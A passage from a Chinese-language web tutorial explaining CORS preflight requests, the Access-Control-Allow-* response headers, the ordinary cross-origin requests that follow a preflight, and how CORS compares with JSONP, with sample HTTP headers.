Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n\n<p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p>\n<p>除了<code>Origin</code>字段，”预检”请求的头信息包括两个特殊字段。</p>\n<blockquote>\n<p><strong>Access-Control-Request-Method</strong></p>\n</blockquote>\n<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是<code>PUT</code>。</p>\n<blockquote>\n<p><strong>Access-Control-Request-Headers</strong></p>\n</blockquote>\n<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>\n<h3 id=\"4-2-预检请求的回应\"><a href=\"#4-2-预检请求的回应\" class=\"headerlink\" title=\"4.2 预检请求的回应\"></a>4.2 预检请求的回应</h3><p>服务器收到”预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class=\"line\">Server: Apache/2.0.61 (Unix)</span><br><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class=\"line\">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br><span class=\"line\">Content-Encoding: gzip</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Keep-Alive: timeout=2, max=100</span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Content-Type: text/plain</span><br></pre></td></tr></table></figure>\n\n<p>上面的HTTP回应中，关键的是<code>Access-Control-Allow-Origin</code>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>\n\n<p>如果服务器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>对象的<code>onerror</code>回调函数捕获。控制台会打印出如下的报错信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">XMLHttpRequest cannot load http://api.alice.com.</span><br><span class=\"line\">Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</span><br></pre></td></tr></table></figure>\n\n<p>服务器回应的其他CORS相关字段如下。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class=\"line\">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class=\"line\">Access-Control-Allow-Credentials: true</span><br><span class=\"line\">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><strong>Access-Control-Allow-Methods</strong></p>\n</blockquote>\n<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p>\n<blockquote>\n<p><strong>Access-Control-Allow-Headers</strong></p>\n</blockquote>\n<p>如果浏览器请求包括<code>Access-Control-Request-Headers</code>字段，则<code>Access-Control-Allow-Headers</code>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p>\n<blockquote>\n<p><strong>Access-Control-Allow-Credentials</strong></p>\n</blockquote>\n<p>该字段与简单请求时的含义相同。</p>\n<blockquote>\n<p><strong>Access-Control-Max-Age</strong></p>\n</blockquote>\n<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>\n<h3 id=\"4-3-浏览器的正常请求和回应\"><a href=\"#4-3-浏览器的正常请求和回应\" class=\"headerlink\" title=\"4.3 浏览器的正常请求和回应\"></a>4.3 浏览器的正常请求和回应</h3><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个<code>Origin</code>头信息字段。服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>头信息字段。</p>\n<p>下面是”预检”请求之后，浏览器的正常CORS请求。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PUT /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">X-Custom-Header: value</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n\n<p>上面头信息的<code>Origin</code>字段是浏览器自动添加的。</p>\n<p>下面是服务器正常的回应。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>\n\n<p>上面头信息中，<code>Access-Control-Allow-Origin</code>字段是每次回应都必定包含的。</p>\n<h2 id=\"五、与jsonp的比较\"><a href=\"#五、与jsonp的比较\" class=\"headerlink\" title=\"五、与jsonp的比较\"></a>五、与jsonp的比较</h2><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>\n<p>JSONP只支持<code>GET</code>请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>\n","categories":["web安全学习"],"tags":["web","安全","SRC"]}]